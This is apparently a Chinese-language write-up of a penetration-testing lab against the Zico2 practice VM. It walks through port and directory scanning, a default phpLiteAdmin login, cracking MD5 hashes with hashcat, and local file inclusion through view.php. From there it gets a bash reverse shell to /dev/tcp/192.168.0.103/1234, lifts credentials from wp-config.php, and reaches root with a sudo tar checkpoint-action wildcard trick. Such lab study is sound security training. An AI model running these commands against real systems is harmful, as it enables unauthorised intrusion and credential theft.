# 信息搜集

1、端口信息搜集

```bash
└─# IP=192.168.0.102
└─# nmap -A -sVC -O  $IP -oA nmap.txt -p `nmap -sS -sU -PN -p- $IP --min-rate=8888 | grep '/tcp\|/udp' | awk -F '/' '{print $1}' | sort -u | tr '\n' ','`
```

```
PORT      STATE  SERVICE VERSION
22/tcp    open   ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 6860dec22bc616d85b88bee3cca12575 (DSA)
|   2048 50db75ba112f43c9ab14406d7fa1eee3 (RSA)
|_  256 115d55298a77d808b4009ba36193fee5 (ECDSA)
80/tcp    open   http    Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Zico's Shop
111/tcp   open   rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          34473/tcp   status
|   100024  1          36954/udp6  status
|   100024  1          47091/udp   status
|_  100024  1          49850/tcp6  status
123/tcp   closed ntp
34473/tcp open   status  1 (RPC #100024)
47091/tcp closed unknown
MAC Address: 00:0C:29:3F:54:90 (VMware)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.5
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2、80 端口目录扫描

```bash
└─# dirb http://192.168.0.102                                                                                                                             
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Jun 28 00:07:53 2023
URL_BASE: http://192.168.0.102/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.0.102/ ----
+ http://192.168.0.102/cgi-bin/ (CODE:403|SIZE:289)                                                                                                              
==> DIRECTORY: http://192.168.0.102/css/                                                                                                                         
==> DIRECTORY: http://192.168.0.102/dbadmin/                                                                                                                     
==> DIRECTORY: http://192.168.0.102/img/                                                                                                                         
+ http://192.168.0.102/index (CODE:200|SIZE:7970)                                                                                                                
+ http://192.168.0.102/index.html (CODE:200|SIZE:7970)                                                                                                           
==> DIRECTORY: http://192.168.0.102/js/                                                                                                                          
+ http://192.168.0.102/LICENSE (CODE:200|SIZE:1094)                                                                                                              
+ http://192.168.0.102/package (CODE:200|SIZE:789)                                                                                                               
+ http://192.168.0.102/server-status (CODE:403|SIZE:294)                                                                                                         
+ http://192.168.0.102/tools (CODE:200|SIZE:8355)                                                                                                                
==> DIRECTORY: http://192.168.0.102/vendor/                                                                                                                      
+ http://192.168.0.102/view (CODE:200|SIZE:0)                                                                                                                                                                                                        
```

```bash
└─# gobuster dir -u http://192.168.0.102 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js,php.bak,txt.bak,html.bak,json,git,git.bak    
===============================================================
===============================================================
/index.html           (Status: 200) [Size: 7970]
/.html.bak            (Status: 403) [Size: 290]
/.html                (Status: 403) [Size: 286]
/index                (Status: 200) [Size: 7970]
/img                  (Status: 301) [Size: 312] [--> http://192.168.0.102/img/]
/tools                (Status: 200) [Size: 8355]
/tools.html           (Status: 200) [Size: 8355]
/view                 (Status: 200) [Size: 0]
/view.php             (Status: 200) [Size: 0]
/css                  (Status: 301) [Size: 312] [--> http://192.168.0.102/css/]
/js                   (Status: 301) [Size: 311] [--> http://192.168.0.102/js/]
/vendor               (Status: 301) [Size: 315] [--> http://192.168.0.102/vendor/]
/package              (Status: 200) [Size: 789]
/package.json         (Status: 200) [Size: 789]
/LICENSE              (Status: 200) [Size: 1094]
/less                 (Status: 301) [Size: 313] [--> http://192.168.0.102/less/]
/.html.bak            (Status: 403) [Size: 290]
/.html                (Status: 403) [Size: 286]
```

发现关键目录  `[Index of /dbadmin](http://192.168.0.102/dbadmin/)`

<img src=".\图片\Snipaste_2023-06-28_12-12-28.png" alt="Snipaste_2023-06-28_12-12-28" style="zoom:80%;" />

# web打点

## 登录 phpLiteAdmin

是phpLiteAdmin的登陆界面，百度下该管理系统的默认密码，查询到默认密码是“admin”，尝试登陆

看到相关密码信息

<img src=".\图片\Snipaste_2023-06-28_12-16-08.png" alt="Snipaste_2023-06-28_12-16-08" style="zoom:80%;" />

hashcat 破解md5  [【内网学习笔记】20、Hashcat 的使用 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/405360160)

```bash
gzip -d /usr/share/wordlists/rockyou.txt.gz
```

```bash
└─# hashcat -a 0 -m 0  653F4B285089453FE00E2AAFAC573414 /usr/share/wordlists/rockyou.txt --show
```

得到账号密码

```
root:34kroot34
zico:zico2215@
```

此时可以尝试 hydra ssh 爆破

## 文件包含拿shell

在主站网页点点点找到了一处特殊 url `[Zico's Shop](http://192.168.0.102/view.php?page=tools.html)`

尝试文件包含

<img src=".\图片\Snipaste_2023-06-28_12-29-32.png" alt="Snipaste_2023-06-28_12-29-32" style="zoom:80%;" />

找到一处包含点，接下来可以思考能在网站哪里插入php一句话，于是利用功能点

<img src=".\图片\Snipaste_2023-06-28_12-46-01.png" alt="Snipaste_2023-06-28_12-46-01" style="zoom:80%;" />

<img src=".\图片\Snipaste_2023-06-28_12-46-30.png" alt="Snipaste_2023-06-28_12-46-30" style="zoom:80%;" />

## 反弹shell

用 /bin/bash -c 接参数的方法反弹

```
/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.0.103/1234 0>&1'
```

```bash
└─# nc -lvvp 1234
listening on [any] 1234 ...
connect to [192.168.0.103] from 192.168.0.102 [192.168.0.102] 60703
bash: no job control in this shell
www-data@zico:/var/www$ python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@zico:/var/www$ 
```

# 提权

## 提权到zico用户

翻看 `/home/zico` 目录下的文件，找到其 wordpress 站下的配置文件，发现密码信息

```bah
www-data@zico:/home/zico/wordpress$ cat wp-config.php | grep define
cat wp-config.php | grep define
define('DB_NAME', 'zico');
define('DB_USER', 'zico');
define('DB_PASSWORD', 'sWfCsfJSPV9H3AmQzw8');
define('DB_HOST', 'zico');
define('DB_CHARSET', 'utf8');
define('DB_COLLATE', '');
define('AUTH_KEY',         'put your unique phrase here');
define('SECURE_AUTH_KEY',  'put your unique phrase here');
define('LOGGED_IN_KEY',    'put your unique phrase here');
define('NONCE_KEY',        'put your unique phrase here');
define('AUTH_SALT',        'put your unique phrase here');
define('SECURE_AUTH_SALT', 'put your unique phrase here');
define('LOGGED_IN_SALT',   'put your unique phrase here');
define('NONCE_SALT',       'put your unique phrase here');
define('WP_DEBUG', false);
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');
```

```
zico:sWfCsfJSPV9H3AmQzw8
```

su 提权

```bash
www-data@zico:/home/zico/wordpress$ su zico
su zico
Password: sWfCsfJSPV9H3AmQzw8

zico@zico:~/wordpress$ whoami
whoami
zico
```

## 提权到 root

找 suid 权限的文件

```
find / -perm -u=s -type f 2>/dev/null
```

查找当前用户能用 root 身份执行什么命令

```bash
zico@zico:~/wordpress$ sudo -l
sudo -l
Matching Defaults entries for zico on this host:
    env_reset, exempt_group=admin,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User zico may run the following commands on this host:
    (root) NOPASSWD: /bin/tar
    (root) NOPASSWD: /usr/bin/zip
```

tar 和 zip 命令能以 sudo 运行时，都能提权的[tar命令提权 - 隐念笎 - 博客园 (cnblogs.com)](https://www.cnblogs.com/zlgxzswjy/p/15210570.html)

```bash
zico@zico:~/wordpress$ cd /tmp
cd /tmp
zico@zico:/tmp$ echo "/bin/bash" > shell.sh
echo "/bin/bash" > shell.sh
zico@zico:/tmp$ echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > "--checkpoint-action=exec=sh shell.sh"
zico@zico:/tmp$ echo "" > --checkpoint=1
echo "" > --checkpoint=1
zico@zico:/tmp$ sudo tar cf archive.tar *
sudo tar cf archive.tar *
root@zico:/tmp# id
id
uid=0(root) gid=0(root) groups=0(root)
```

<img src=".\图片\Snipaste_2023-06-28_13-06-39.png" alt="Snipaste_2023-06-28_13-06-39" style="zoom:80%;" />

# 总结

枚举很重要，所以在打点的过程中留意得到的**用户名或者密码信息**，把它们做成字典，泡泡 ssh 、后台登录、数据库连接等等

url 里类似 `?page=tools.html` 可能就存在文件包含啥的，发现网站存在文件包含时，要留意网站的功能点是否存在插入 shell 的地方，再来包含

php 一句话 get方式反弹shell时 注意 用 **/bin/bash -c 接参数的方法反弹**

得到一定权限时，二次信息搜集时，注意用户的 **home 目录**里的信息和**网站配置文件**的信息


